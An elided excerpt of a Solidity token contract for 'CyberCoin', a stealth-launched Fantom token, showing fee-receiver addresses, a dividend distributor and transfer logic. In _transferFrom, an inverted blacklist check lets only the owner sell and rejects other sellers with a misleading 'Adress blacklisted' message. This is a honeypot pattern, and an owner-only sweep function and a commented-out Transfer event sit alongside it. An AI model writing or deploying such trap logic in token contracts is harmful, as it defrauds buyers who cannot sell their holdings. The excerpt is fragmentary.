...
/*
CyberCoin - Stealth launched 02/13/22
https://t.me/cybercoinftm
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x658b0c7613e890EE50B8C4BC6A3f41ef411208aD);
...
contract CyberCoin is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83; 
    address public WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "CYBERCOIN";
    ...
    address public autoLiquidityReceiver=0x97440aecd88bd2665E691B8f012253a27175bf48; 
    address public marketingFeeReceiver=0x97440aecd88bd2665E691B8f012253a27175bf48; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!isNotBlacklisted || sender==owner), "Adress blacklisted, contact an admin");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function sweep(bool value) external onlyOwner {
